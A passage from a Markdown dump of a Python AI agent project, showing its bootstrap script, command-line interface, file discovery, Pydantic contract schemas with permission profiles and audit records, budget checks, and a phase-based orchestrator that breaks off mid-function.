            if hits:
                rag_context = "\n".join(f"[{h['file']}]: {h['content'][:300]}" for h in hits)
                style = self.rag_enhancement_style
                self.history.append({
                    "role": "assistant",
                    "content": f"----\n#RAG CONTEXT - DO NOT REPEAT VERBATIM\n{style}\n{rag_context}\n----"
                })
            return hits, None

        return None, f"Unknown RAG command: {subcmd}"

```

## `core/bootstrap.py`

```python
# core/bootstrap.py

import subprocess
import venv
from pathlib import Path
import shutil
import platform

def check_system_requirements():
    print("🔍 Checking system dependencies...")
    pkg_mgr = detect_package_manager()
    missing = []

    if not shutil.which("gcc"):
        missing.append("gcc")
    if not Path("/usr/include/alsa/asoundlib.h").exists():
        missing.append("alsa-lib-devel")

    if missing:
        print(f"⚠️ Missing system dependencies: {', '.join(missing)}")
        if pkg_mgr == "dnf":
            print("👉 Install with: sudo dnf install alsa-lib-devel gcc make python3-devel")
        elif pkg_mgr == "apt":
            print("👉 Install with: sudo apt install libasound2-dev build-essential python3-dev")
        elif pkg_mgr == "pacman":
            print("👉 Install with: sudo pacman -S alsa-lib base-devel python")
        else:
            print("❗ Unknown system. Please install the appropriate development tools and ALSA headers manually.")

def detect_package_manager():
    if shutil.which("dnf"):
        return "dnf"
    elif shutil.which("apt"):
        return "apt"
    elif shutil.which("pacman"):
        return "pacman"
    else:
        return "unknown"

def bootstrap_env(name: str = "jlenv"):
    check_system_requirements()

    env_dir = Path(f".{name}").resolve()
    python_bin = env_dir / "bin" / "python"
    pip_bin = env_dir / "bin" / "pip"

    if not python_bin.exists():
        print(f"🧙 Creating .{name} virtual environment...")
        venv.create(str(env_dir), with_pip=True)

    print(f"📦 Upgrading pip inside .{name}...")
    subprocess.run([str(python_bin), "-m", "pip", "install", "--upgrade", "pip", "setuptools", "wheel"], check=True)

    print(f"📚 Installing from requirements.txt...")
    subprocess.run([str(pip_bin), "install", "-r", "requirements.txt"], check=True)

    print(f"🔁 Installing project in editable mode via {python_bin}...")
    subprocess.run([str(python_bin), "-m", "pip", "install", "-e", "."], check=True)

    print(f"✅ .{name} is ready!")


if __name__ == "__main__":
    import sys
    bootstrap_env(sys.argv[1] if len(sys.argv) > 1 else "jlenv")


```

## `core/cli.py`

```python
#!/usr/bin/env python3
import argparse
import os
from pathlib import Path
from rich.console import Console
from rich.markdown import Markdown

GREEN = "\033[92m"
RESET = "\033[0m"
console = Console()


def strip_markdown(md: str) -> str:
    """Convert Markdown to plain text for optional TTS."""
    from io import StringIO
    from rich.console import Console as StrippedConsole
    from rich.text import Text

    sio = StringIO()
    stripped_console = StrippedConsole(file=sio, force_terminal=False, color_system=None)
    stripped_console.print(Markdown(md))
    return Text.from_markup(sio.getvalue()).plain


def _main(AgentClass):
    parser = argparse.ArgumentParser(description=f"{AgentClass.__name__} CLI Interface")
    parser.add_argument("message", type=str, help="Your message to the AI")
    parser.add_argument("--empty", action="store_true", help="Start new conversation")
    parser.add_argument("--purge", action="store_true", help="Purge long-term memory")
    parser.add_argument("--secret", action="store_true", help="Do not save this message")

    parser.add_argument("--model", type=str, help="Model to use")
    parser.add_argument("--provider", type=str, choices=["openai", "mistral"],
                        help="Force provider backend")

    parser.add_argument("--md", action="store_true", help="Non-streaming markdown output")
    parser.add_argument("--raw", action="store_true", help="Stream output (default)")

    # tools
    parser.add_argument("--search", action="store_true", help="Perform web search")
    parser.add_argument("--deep", action="store_true", help="Deep search")
    parser.add_argument("--shell", action="store_true", help="Generate and run shell code")
    parser.add_argument("--python", action="store_true", help="Generate and run Python code")
    parser.add_argument("--install-project", action="store_true",
                        help="Install Python project into elf venv")

    # memory recall
    parser.add_argument("--recall", nargs="+",
                        help="Recall past adventures (n [mode])")
    parser.add_argument("--long-term", type=int, help="Recall N best matches from memory")

    parser.add_argument("--summarize", action="store_true", help="Summarize tool output")
    parser.add_argument("--voice", action="store_true", help="Speak the response aloud (lazy TTS)")

    # RAG
    parser.add_argument("--rag", nargs="+",
                        help="RAG ops: crawl/find/delete/list/status/enhance")
    parser.add_argument("--dir", type=Path, help="Directory for RAG")
    parser.add_argument("--recursive", action="store_true", help="Recurse into directories")
    parser.add_argument("--include", action="append", help="Include globs")
    parser.add_argument("--exclude", action="append", help="Exclude globs")

    args = parser.parse_args()
    os.environ.setdefault("COQUI_TTS_LOG_LEVEL", "ERROR")

    print(f"{GREEN}👤 You: {args.message}{RESET}")

    # --- instantiate Elf ---
    elf = AgentClass(model=args.model, provider=args.provider)
    style = getattr(elf, "text_color", "cyan")
    provider_name = elf.client.provider.upper()
    console.print(f"🧠 Using provider: {provider_name} | Model: {elf.model}", style=style)

    # --- lazy voice registration ---
    if args.voice:
        try:
            from core.tools.speak_text import SpeakTextTool
            elf.tools.register_tool("speak_text", SpeakTextTool())
        except Exception as e:
            console.print(f"⚠️ Voice unavailable: {e}", style="yellow")

    # --- RAG handling ---
    if args.rag:
        subcmd = args.rag[0]
        query = " ".join(args.rag[1:]) if len(args.rag) > 1 else args.message
        hits, msg = elf.handle_rag(subcmd, query, args.dir,
                                   recursive=args.recursive,
                                   includes=args.include, excludes=args.exclude)
        if msg:
            console.print(msg, style=style)
            if not args.secret:
                elf.memory.add_short("system", msg)
        if hits:
            console.print(f"📚 Injected {len(hits)} RAG hits", style=style)
        if subcmd != "enhance":
            return

    # --- memory management ---
    if args.empty:
        elf.reset_history()
        console.print("🧹 Starting fresh.", style=style)
    if args.purge:
        elf.purge_memory()
        console.print(f"🧠 {AgentClass.__name__} purged long-term memory.", style=style)

    elf.enrich_with_memory(args.message)
    if args.search:
        elf.enrich_with_search(args.message, deep=args.deep)
        console.print(f"🔍 {AgentClass.__name__} searching...", style=style)

    if args.recall:
        n = int(args.recall[0])
        mode = args.recall[1] if len(args.recall) > 1 else None
        rows = elf.recall_adventures(n=n, mode=mode)
        reflection = elf.format_recall(rows) if rows else None
        if reflection:
            console.print(f"📖 Recall:\n{reflection}", style=style)
    else:
        reflection = None

    # =====================================================
    # 🧩 Restored Code Execution Hooks
    # =====================================================
    try:
        if args.python:
            code, result, success, summary = elf.run_python_task(args.message, reflection, summarize=args.summarize)
            console.print(f"🧠 {AgentClass.__name__} wrote Python:\n{code}", style=style)
            console.print(f"💥 Result:\n{result}", style=style)
            if summary:
                console.print(f"🧾 Summary:\n{summary}", style=style)
            return

        if args.shell:
            cmd, result, success, summary = elf.run_shell_task(args.message, reflection, summarize=args.summarize)
            console.print(f"🧠 {AgentClass.__name__} executed shell:\n{cmd}", style=style)
            console.print(f"💥 Output:\n{result}", style=style)
            if summary:
                console.print(f"🧾 Summary:\n{summary}", style=style)
            return
    except Exception as e:
        console.print(f"\n❌ Code execution error: {e}", style="red")
        return

    # =====================================================
    # 🧠 Normal Chat Path
    # =====================================================
    try:
        if args.md:
            reply = elf.chat(args.message, stream=False)
            console.print(Markdown(f"🧞 **{AgentClass.__name__}:** {reply}"), style=style)
            if args.voice:
                elf.tools.run("speak_text", strip_markdown(reply))
        else:
            resp_iter = elf.chat(args.message, stream=True)
            console.print(f"🧞 {AgentClass.__name__}: ", style=style, end="")
            reply = ""
            for chunk in resp_iter:
                if hasattr(chunk, "choices"):
                    delta = getattr(chunk.choices[0], "delta", None)
                    content = getattr(delta, "content", None) if delta else None
                    if content:
                        console.print(content, style=style, end="")
                        reply += content
            print()
            if args.voice and reply:
                elf.tools.run("speak_text", reply)

        if not args.secret:
            elf.history.append({"role": "assistant", "content": reply})
            elf.save_history()
            elf.remember(args.message, reply)

    except Exception as e:
        console.print(f"\n❌ Error: {e}", style="red")


def main_lobi():
    from lobi import Lobi
    _main(Lobi)


def main_judais():
    from judais import JudAIs
    _main(JudAIs)

```

## `core/context/__init__.py`

```python
# core/context/__init__.py — Repo map and context compression

```

## `core/context/file_discovery.py`

```python
# core/context/file_discovery.py — File discovery and language classification

from pathlib import Path
from typing import Callable, List, Optional, Set, Tuple

from core.tools.executor import run_subprocess


# ---------------------------------------------------------------------------
# Language classification
# ---------------------------------------------------------------------------

LANGUAGE_MAP = {
    ".py": "python",
    ".pyi": "python",
    ".js": "javascript",
    ".jsx": "javascript",
    ".ts": "typescript",
    ".tsx": "typescript",
    ".c": "c",
    ".h": "c",
    ".cpp": "cpp",
    ".cxx": "cpp",
    ".cc": "cpp",
    ".hpp": "cpp",
    ".hxx": "cpp",
    ".hh": "cpp",
    ".rs": "rust",
    ".go": "go",
    ".java": "java",
    ".rb": "ruby",
    ".php": "php",
    ".sh": "shell",
    ".bash": "shell",
    ".zsh": "shell",
    ".lua": "lua",
    ".pl": "perl",
    ".pm": "perl",
    ".r": "r",
    ".R": "r",
    ".scala": "scala",
    ".kt": "kotlin",
    ".kts": "kotlin",
    ".swift": "swift",
    ".m": "objc",
    ".mm": "objc",
    ".cs": "csharp",
    ".fs": "fsharp",
    ".hs": "haskell",
    ".ml": "ocaml",
    ".mli": "ocaml",
    ".ex": "elixir",
    ".exs": "elixir",
    ".erl": "erlang",
    ".clj": "clojure",
    ".zig": "zig",
    ".nim": "nim",
    ".d": "d",
    ".v": "verilog",
    ".sv": "systemverilog",
    ".sql": "sql",
    ".yaml": "yaml",
    ".yml": "yaml",
    ".toml": "toml",
    ".json": "json",
    ".xml": "xml",
    ".html": "html",
    ".css": "css",
    ".scss": "scss",
    ".less": "less",
    ".md": "markdown",
    ".rst": "rst",
    ".txt": "text",
    ".cmake": "cmake",
    ".Makefile": "makefile",
}

# Extensions to always skip (binary or non-source)
BINARY_EXTENSIONS: Set[str] = {
    ".png", ".jpg", ".jpeg", ".gif", ".bmp", ".ico", ".svg", ".webp",
    ".mp3", ".mp4", ".wav", ".avi", ".mov", ".flac", ".ogg",
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".zip", ".tar", ".gz", ".bz2", ".xz", ".7z", ".rar",
    ".whl", ".egg", ".pyc", ".pyo", ".so", ".dll", ".dylib", ".a", ".o", ".obj",
    ".class", ".jar",
    ".ttf", ".otf", ".woff", ".woff2", ".eot",
    ".db", ".sqlite", ".sqlite3",
    ".bin", ".dat", ".exe", ".msi",
    ".lock",
}

# Directories to skip during pathlib walk
DEFAULT_IGNORE_PATTERNS: Set[str] = {
    "__pycache__", ".git", ".hg", ".svn",
    "node_modules", "vendor", ".venv", "venv", "env",
    ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache",
    "dist", "build", ".eggs", "*.egg-info",
    ".judais-lobi", ".claude",
    "target",  # Rust / Java
}


def classify_language(path: str) -> str:
    """Classify a file path to a language string. Returns '' for unknown."""
    p = Path(path)
    # Check for Makefile (no extension)
    if p.name in ("Makefile", "makefile", "GNUmakefile"):
        return "makefile"
    if p.name in ("Dockerfile",):
        return "dockerfile"
    return LANGUAGE_MAP.get(p.suffix, "")


def _is_binary(path: str) -> bool:
    """Check if a file is binary based on extension."""
    return Path(path).suffix.lower() in BINARY_EXTENSIONS


def _should_ignore_dir(name: str) -> bool:
    """Check if a directory name matches ignore patterns."""
    return name in DEFAULT_IGNORE_PATTERNS or name.endswith(".egg-info")


# ---------------------------------------------------------------------------
# Git-based discovery
# ---------------------------------------------------------------------------

def discover_files_git(
    repo_path: str,
    subprocess_runner: Optional[Callable] = None,
) -> List[str]:
    """Discover tracked files via git ls-files. Raises RuntimeError on failure."""
    cmd = f"cd {_quote(repo_path)} && git ls-files"
    rc, stdout, stderr = run_subprocess(
        cmd, shell=True, timeout=30,
        subprocess_runner=subprocess_runner,
    )
    if rc != 0:
        raise RuntimeError(f"git ls-files failed (rc={rc}): {stderr}")
    files = [f for f in stdout.splitlines() if f.strip() and not _is_binary(f)]
    return sorted(files)


# ---------------------------------------------------------------------------
# Pathlib fallback discovery
# ---------------------------------------------------------------------------

def discover_files_walk(
    root: str,
    ignore_patterns: Optional[Set[str]] = None,
) -> List[str]:
    """Discover files via pathlib walk, respecting ignore patterns."""
    ignore = ignore_patterns if ignore_patterns is not None else DEFAULT_IGNORE_PATTERNS
    root_path = Path(root)
    results: List[str] = []

    def _walk(directory: Path) -> None:
        try:
            entries = sorted(directory.iterdir())
        except PermissionError:
            return
        for entry in entries:
            if entry.is_dir():
                if not _should_ignore_dir(entry.name):
                    _walk(entry)
            elif entry.is_file():
                if not _is_binary(str(entry)):
                    try:
                        rel = str(entry.relative_to(root_path))
                        results.append(rel)
                    except ValueError:
                        pass

    _walk(root_path)
    return sorted(results)


# ---------------------------------------------------------------------------
# Unified discovery
# ---------------------------------------------------------------------------

def discover_files(
    repo_path: str,
    subprocess_runner: Optional[Callable] = None,
) -> List[str]:
    """Discover files: try git ls-files first, fall back to pathlib walk."""
    try:
        return discover_files_git(repo_path, subprocess_runner)
    except (RuntimeError, Exception):
        return discover_files_walk(repo_path)


def _quote(s: str) -> str:
    """Simple shell quoting."""
    import shlex
    return shlex.quote(s)

```

## `core/context/models.py`

```python
# core/context/models.py — Data models for repo map extraction

from dataclasses import dataclass, field
from typing import Dict, List, Optional

from pydantic import BaseModel


# ---------------------------------------------------------------------------
# Pure dataclasses for internal extraction pipeline
# ---------------------------------------------------------------------------

@dataclass
class SymbolDef:
    """A single extracted symbol (function, class, constant)."""
    name: str
    kind: str  # "function", "class", "method", "constant"
    signature: str = ""
    parent: str = ""  # enclosing class name for methods
    decorators: List[str] = field(default_factory=list)
    line: int = 0


@dataclass
class ImportEdge:
    """A single import statement resolved to a module path."""
    module: str  # e.g. "core.kernel.state" or "os.path"
    names: List[str] = field(default_factory=list)  # e.g. ["Phase", "SessionState"]
    is_relative: bool = False


@dataclass
class FileSymbols:
    """Extraction results for a single file."""
    rel_path: str
    language: str = ""
    symbols: List[SymbolDef] = field(default_factory=list)
    imports: List[ImportEdge] = field(default_factory=list)


@dataclass
class RepoMapData:
    """Full repo map: all files with their symbols and imports.

    This is the cacheable artifact produced by a full extraction pass.
    """
    repo_root: str
    files: Dict[str, FileSymbols] = field(default_factory=dict)  # rel_path -> FileSymbols
    commit_hash: str = ""

    @property
    def total_files(self) -> int:
        return len(self.files)

    @property
    def total_symbols(self) -> int:
        return sum(len(fs.symbols) for fs in self.files.values())


# ---------------------------------------------------------------------------
# Pydantic model for phase artifact storage
# ---------------------------------------------------------------------------

class RepoMapResult(BaseModel):
    """Result artifact for the REPO_MAP phase and RETRIEVE context."""
    excerpt: str = ""
    total_files: int = 0
    total_symbols: int = 0
    excerpt_token_estimate: int = 0
    files_shown: int = 0
    files_omitted: int = 0

```

## `core/contracts/__init__.py`

```python
# core/contracts/__init__.py — Re-exports all contract models

from core.contracts.schemas import (
    PersonalityConfig,
    TaskContract,
    PlanStep,
    ChangePlan,
    RetrievedChunk,
    MemoryPin,
    ContextPack,
    FilePatch,
    PatchSet,
    RunReport,
    PermissionRequest,
    PermissionGrant,
    PolicyPack,
    ToolTrace,
    FinalReport,
    ProfileMode,
    GodModeGrant,
    AuditEntry,
    PHASE_SCHEMAS,
)

__all__ = [
    "PersonalityConfig",
    "TaskContract",
    "PlanStep",
    "ChangePlan",
    "RetrievedChunk",
    "MemoryPin",
    "ContextPack",
    "FilePatch",
    "PatchSet",
    "RunReport",
    "PermissionRequest",
    "PermissionGrant",
    "PolicyPack",
    "ToolTrace",
    "FinalReport",
    "ProfileMode",
    "GodModeGrant",
    "AuditEntry",
    "PHASE_SCHEMAS",
]

```

## `core/contracts/schemas.py`

```python
# core/contracts/schemas.py — All Pydantic v2 contract models

from datetime import datetime, timezone
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from pydantic import BaseModel, Field

from core.context.models import RepoMapResult


# ---------------------------------------------------------------------------
# Personality configuration (replaces Elf's abstract properties)
# ---------------------------------------------------------------------------

class PersonalityConfig(BaseModel):
    """Frozen personality definition. Replaces Elf's abstract properties."""

    model_config = {"frozen": True}

    name: str
    system_message: str
    examples: List[Tuple[str, str]]
    text_color: str = "cyan"
    env_path: str = "~/.elf_env"
    rag_enhancement_style: str = ""
    default_model: Optional[str] = None
    default_provider: Optional[str] = None


# ---------------------------------------------------------------------------
# Task & planning contracts
# ---------------------------------------------------------------------------

class TaskContract(BaseModel):
    """Defines the task to be executed."""
    task_id: str
    description: str
    constraints: List[str] = []
    acceptance_criteria: List[str] = []
    allowed_tools: List[str] = []
    created_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))


class PlanStep(BaseModel):
    """A single step in a change plan."""
    description: str
    target_file: Optional[str] = None
    action: str  # "create", "modify", "delete", "test"


class ChangePlan(BaseModel):
    """Ordered list of steps to execute a task."""
    task_id: str
    steps: List[PlanStep]
    target_files: List[str] = []
    rationale: str = ""


# ---------------------------------------------------------------------------
# Memory & retrieval contracts
# ---------------------------------------------------------------------------

class RetrievedChunk(BaseModel):
    """A single chunk retrieved from RAG or memory."""
    source: str
    content: str
    relevance_score: float = 0.0


class MemoryPin(BaseModel):
    """Pins a memory retrieval result into session artifacts."""
    embedding_backend: str
    model_name: str
    query: str
    chunk_ids: List[int]
    similarity_scores: List[float]
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))


class ContextPack(BaseModel):
    """Aggregated context for a task: repo map + retrieved chunks + memory pins."""
    task_id: str
    repo_map_excerpt: str = ""
    retrieved_chunks: List[RetrievedChunk] = []
    memory_pins: List[MemoryPin] = []


# ---------------------------------------------------------------------------
# Patch contracts
# ---------------------------------------------------------------------------

class FilePatch(BaseModel):
    """A single file-level patch (search/replace block)."""
    file_path: str
    search_block: str = ""
    replace_block: str = ""
    action: str = "modify"


class PatchSet(BaseModel):
    """Collection of file patches for a task."""
    task_id: str
    patches: List[FilePatch] = []


# ---------------------------------------------------------------------------
# Execution contracts
# ---------------------------------------------------------------------------

class RunReport(BaseModel):
    """Result of running tests or commands."""
    exit_code: int = 0
    stdout: str = ""
    stderr: str = ""
    passed: bool = False
    duration_seconds: float = 0.0


# ---------------------------------------------------------------------------
# Permission contracts
# ---------------------------------------------------------------------------

class PermissionRequest(BaseModel):
    """Request to use a tool or access a scope."""
    tool_name: str
    scope: str
    reason: str
    requested_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))


class PermissionGrant(BaseModel):
    """Record of a granted permission for deterministic replay."""
    tool_name: str
    scope: str
    granted_by: str = "user"
    grant_issued_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    grant_duration_seconds: Optional[float] = None
    grant_scope: str = "session"


class PolicyPack(BaseModel):
    """Security and sandbox policy for a session."""
    allowed_tools: List[str] = []
    allowed_scopes: List[str] = []
    sandbox_backend: str = "bwrap"
    budget_overrides: Dict[str, Any] = {}
    allowed_mounts: List[str] = []
    allowed_network_domains: List[str] = []


# ---------------------------------------------------------------------------
# Tool tracing contracts (Phase 4)
# ---------------------------------------------------------------------------

class ToolTrace(BaseModel):
    """Records a single tool invocation for audit and replay."""
    tool_name: str
    payload_summary: str = ""
    exit_code: int = 0
    stdout_excerpt: str = ""
    stderr_excerpt: str = ""
    scopes_used: List[str] = []
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))


# ---------------------------------------------------------------------------
# Finalization contracts
# ---------------------------------------------------------------------------

class FinalReport(BaseModel):
    """Summary of a completed or halted task."""
    task_description: str
    outcome: str  # "completed" | "halted"
    halt_reason: Optional[str] = None
    artifacts_produced: List[str] = []
    total_iterations: int = 0
    duration_seconds: float = 0.0


# ---------------------------------------------------------------------------
# Profile & God Mode contracts (Phase 4b)
# ---------------------------------------------------------------------------

class ProfileMode(str, Enum):
    """Permission profile levels. Each level includes all scopes from lower levels."""
    SAFE = "safe"       # read-only: fs.read, git.read, verify.run
    DEV = "dev"         # safe + write: fs.write, git.write, python.exec, shell.exec
    OPS = "ops"         # dev + deploy: git.push, git.fetch, pip.install, http.read, fs.delete
    GOD = "god"         # all scopes (wildcard "*")


class GodModeGrant(BaseModel):
    """Records a god mode activation for audit purposes."""
    activated_by: str = "user"
    reason: str
    ttl_seconds: float = 300.0
    activated_at: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    panic_revoked: bool = False


class AuditEntry(BaseModel):
    """Single entry in the append-only audit log."""
    timestamp: datetime = Field(default_factory=lambda: datetime.now(timezone.utc))
    event_type: str = ""
    tool_name: str = ""
    action: str = ""
    scopes: List[str] = []
    profile: str = ""
    verdict: str = ""
    detail: str = ""
    session_id: str = ""


# ---------------------------------------------------------------------------
# Phase → schema mapping (phases with structured output)
# ---------------------------------------------------------------------------

PHASE_SCHEMAS: Dict[str, type] = {
    "INTAKE": TaskContract,
    "CONTRACT": TaskContract,
    "REPO_MAP": RepoMapResult,
    "PLAN": ChangePlan,
    "RETRIEVE": ContextPack,
    "PATCH": PatchSet,
    "RUN": RunReport,
    "FINALIZE": FinalReport,
}

```

## `core/contracts/validation.py`

```python
# core/contracts/validation.py — Schema validation for phase outputs

from typing import Optional, Type

from pydantic import BaseModel, ValidationError

from core.kernel.state import Phase
from core.contracts.schemas import PHASE_SCHEMAS


def get_schema_for_phase(phase: Phase) -> Optional[Type[BaseModel]]:
    """Return the expected Pydantic schema for a phase, or None if unstructured."""
    return PHASE_SCHEMAS.get(phase.name)


def validate_phase_output(phase: Phase, data) -> BaseModel:
    """Validate output against the expected schema for a phase.

    If data is already an instance of the expected schema, returns it directly.
    If data is a dict, attempts to construct the schema from it.
    Raises ValidationError on failure, ValueError if no schema exists.
    """
    schema = get_schema_for_phase(phase)
    if schema is None:
        raise ValueError(f"No schema defined for phase {phase.name}")

    if isinstance(data, schema):
        return data

    if isinstance(data, dict):
        return schema(**data)

    raise ValidationError.from_exception_data(
        title=schema.__name__,
        line_errors=[],
    )

```

## `core/kernel/__init__.py`

```python
# core/kernel/__init__.py

from core.kernel.state import (
    Phase,
    SessionState,
    TRANSITIONS,
    InvalidTransition,
    validate_transition,
)
from core.kernel.budgets import (
    BudgetConfig,
    BudgetExhausted,
    PhaseRetriesExhausted,
    TotalIterationsExhausted,
    PhaseTimeoutExhausted,
    check_phase_retries,
    check_total_iterations,
    check_phase_time,
    check_all_budgets,
)
from core.kernel.orchestrator import (
    Orchestrator,
    RoleDispatcher,
    PhaseResult,
)

__all__ = [
    "Phase",
    "SessionState",
    "TRANSITIONS",
    "InvalidTransition",
    "validate_transition",
    "BudgetConfig",
    "BudgetExhausted",
    "PhaseRetriesExhausted",
    "TotalIterationsExhausted",
    "PhaseTimeoutExhausted",
    "check_phase_retries",
    "check_total_iterations",
    "check_phase_time",
    "check_all_budgets",
    "Orchestrator",
    "RoleDispatcher",
    "PhaseResult",
]

```

## `core/kernel/budgets.py`

```python
# core/kernel/budgets.py — Hard budget configuration and enforcement

import time
from dataclasses import dataclass

from core.kernel.state import Phase, SessionState


@dataclass(frozen=True)
class BudgetConfig:
    """Hard budget parameters for a kernel session. Immutable after creation."""
    max_phase_retries: int = 3
    max_total_iterations: int = 30
    max_time_per_phase_seconds: float = 300.0
    max_tool_output_bytes_in_context: int = 32_768
    max_context_tokens_per_role: int = 16_384


class BudgetExhausted(Exception):
    """Base exception for all budget violations."""
    pass


class PhaseRetriesExhausted(BudgetExhausted):
    """Raised when a phase exceeds max_phase_retries."""

    def __init__(self, phase: Phase, retries: int, max_retries: int):
        self.phase = phase
        self.retries = retries
        self.max_retries = max_retries
        super().__init__(
            f"Phase {phase.name} exhausted retries: {retries}/{max_retries}"
        )


class TotalIterationsExhausted(BudgetExhausted):
    """Raised when total iterations across all phases exceeds the cap."""

    def __init__(self, iterations: int, max_iterations: int):
        self.iterations = iterations
        self.max_iterations = max_iterations
        super().__init__(
            f"Total iterations exhausted: {iterations}/{max_iterations}"
        )


class PhaseTimeoutExhausted(BudgetExhausted):
    """Raised when a single phase exceeds its time budget."""

    def __init__(self, phase: Phase, elapsed: float, max_seconds: float):
        self.phase = phase
        self.elapsed = elapsed
        self.max_seconds = max_seconds
        super().__init__(
            f"Phase {phase.name} timed out: {elapsed:.1f}s/{max_seconds:.1f}s"
        )


def check_phase_retries(state: SessionState, config: BudgetConfig) -> None:
    """Raise PhaseRetriesExhausted if current phase has exceeded retries."""
    retries = state.phase_retries.get(state.current_phase, 0)
    if retries >= config.max_phase_retries:
        raise PhaseRetriesExhausted(
            state.current_phase, retries, config.max_phase_retries
        )


def check_total_iterations(state: SessionState, config: BudgetConfig) -> None:
    """Raise TotalIterationsExhausted if session has exceeded iteration cap."""
    if state.total_iterations >= config.max_total_iterations:
        raise TotalIterationsExhausted(
            state.total_iterations, config.max_total_iterations
        )


def check_phase_time(state: SessionState, config: BudgetConfig) -> None:
    """Raise PhaseTimeoutExhausted if current phase has exceeded time budget."""
    if state.phase_start_time is None:
        return
    elapsed = time.monotonic() - state.phase_start_time
    if elapsed > config.max_time_per_phase_seconds:
        raise PhaseTimeoutExhausted(
            state.current_phase, elapsed, config.max_time_per_phase_seconds
        )


def check_all_budgets(state: SessionState, config: BudgetConfig) -> None:
    """Run all budget checks. Raises the first violation found.

    Order: total iterations (most absolute) -> phase retries -> phase time.
    """
    check_total_iterations(state, config)
    check_phase_retries(state, config)
    check_phase_time(state, config)

```

## `core/kernel/orchestrator.py`

```python
# core/kernel/orchestrator.py — Main orchestration loop

import logging
from dataclasses import dataclass
from typing import Any, Optional, Protocol

from core.kernel.state import Phase, SessionState, InvalidTransition
from core.kernel.budgets import BudgetConfig, BudgetExhausted, check_all_budgets

logger = logging.getLogger(__name__)


@dataclass
class PhaseResult:
    """Outcome of executing a single phase."""
    success: bool
    output: Any = None
    error: Optional[str] = None
    needs_fix: bool = False


class RoleDispatcher(Protocol):
    """Protocol for phase-specific role execution.

    Implementations are injected into the Orchestrator.
    Phase 7 provides real implementations; Phase 2 tests use stubs.
    """

    def dispatch(self, phase: Phase, state: SessionState) -> PhaseResult: ...


# Linear phase order (excludes FIX, HALTED, COMPLETED — those are branching targets)
_PHASE_ORDER = [
    Phase.INTAKE, Phase.CONTRACT, Phase.REPO_MAP, Phase.PLAN,
    Phase.RETRIEVE, Phase.PATCH, Phase.CRITIQUE, Phase.RUN,
]


class Orchestrator:
    """Drives the kernel state machine through all phases.

    Reads current state, selects next phase, dispatches to roles,
    and enforces hard budgets. The orchestrator never touches the
    filesystem directly — all I/O goes through the injected dispatcher
    and optional SessionManager.
    """

    def __init__(
        self,
        dispatcher: RoleDispatcher,
        budget: Optional[BudgetConfig] = None,
        session_manager=None,
        tool_bus=None,
    ):
        self._dispatcher = dispatcher
        self._budget = budget or BudgetConfig()
        self._session_manager = session_manager
        self._tool_bus = tool_bus
        self._artifact_sequence = 0

    def run(self, task: str) -> SessionState:
        """Execute a complete task through the state machine.

        Returns the final SessionState (COMPLETED or HALTED).
        """
        state = SessionState(task_description=task)

        if self._session_manager is not None:
            state.session_id = self._session_manager.session_id
            state.session_dir = self._session_manager.session_dir

        while not self._is_terminal(state.current_phase):
            try:
                check_all_budgets(state, self._budget)

                # Checkpoint before PATCH for rollback on RUN failure
                if (state.current_phase == Phase.PATCH
                        and self._session_manager is not None):
                    label = f"pre_PATCH_{state.total_iterations:03d}"
                    self._session_manager.checkpoint(label)
                    state.artifacts["_last_patch_checkpoint"] = label

                result = self._execute_phase(state)

                # Validate and record artifact if session_manager present
                if result.success and self._session_manager is not None:
                    validation_result = self._validate_and_record(state, result)
                    if validation_result is not None:
                        result = validation_result

                # On RUN failure, attempt rollback to pre-PATCH checkpoint
                if (state.current_phase == Phase.RUN
                        and not result.success
                        and self._session_manager is not None):
                    checkpoint_label = state.artifacts.get("_last_patch_checkpoint")
                    if checkpoint_label:
                        try:
                            self._session_manager.rollback(checkpoint_label)
                            logger.info("Rolled back to checkpoint: %s", checkpoint_label)
                        except FileNotFoundError:
                            logger.warning("Checkpoint %s not found for rollback", checkpoint_label)

                next_phase = self._select_next_phase(state, result)
                if next_phase is not None:
                    state.enter_phase(next_phase)
            except BudgetExhausted as exc:
                logger.warning("Budget exhausted: %s", exc)
                state.halt(str(exc))
            except InvalidTransition as exc:
                logger.error("Invalid transition: %s", exc)
                state.halt(str(exc))

        return state

    def _execute_phase(self, state: SessionState) -> PhaseResult:
        """Dispatch current phase to the role handler."""
        logger.info("Executing phase: %s", state.current_phase.name)
        result = self._dispatcher.dispatch(state.current_phase, state)
        if not isinstance(result, PhaseResult):
            result = PhaseResult(success=True, output=result)
        if not result.success:
            retry_count = state.record_phase_retry(state.current_phase)
            logger.info(
                "Phase %s failed (retry %d/%d): %s",
                state.current_phase.name,
                retry_count,
                self._budget.max_phase_retries,
                result.error,
            )
        return result

    def _validate_and_record(self, state: SessionState, result: PhaseResult) -> Optional[PhaseResult]:
        """Validate phase output against schema, write artifact if valid.

        Returns None if validation succeeds (or no schema).
        Returns a failed PhaseResult if validation fails (burns a retry).
        """
        from core.contracts.validation import get_schema_for_phase, validate_phase_output

        schema = get_schema_for_phase(state.current_phase)
        if schema is None:
            return None

        if result.output is None:
            return None

        try:
            validated = validate_phase_output(state.current_phase, result.output)
            path = self._session_manager.write_artifact(
                state.current_phase.name,
                self._artifact_sequence,
                validated,
            )
            self._artifact_sequence += 1
            state.artifacts[state.current_phase.name] = str(path)
            return None
        except Exception as exc:
            logger.warning(
                "Validation failed for phase %s: %s",
                state.current_phase.name, exc,
            )
            retry_count = state.record_phase_retry(state.current_phase)
            return PhaseResult(
                success=False,
                error=f"Validation failed: {exc}",
            )

    def _select_next_phase(
        self, state: SessionState, result: PhaseResult,
    ) -> Optional[Phase]:
        """Determine the next phase based on current state and phase result.

        Returns None if the current phase should be retried (failure in a
        non-RUN linear phase). The main loop skips enter_phase in that case,
        and the next iteration's budget check catches exhausted retries.
        """
        current = state.current_phase

        # RUN branches: success → FINALIZE, failure → FIX
        if current == Phase.RUN:
            return Phase.FINALIZE if result.success else Phase.FIX

        # FIX always loops back to PATCH
        if current == Phase.FIX:
            return Phase.PATCH

        # FINALIZE → COMPLETED
        if current == Phase.FINALIZE:
            return Phase.COMPLETED

        # For all other phases: retry on failure, advance on success
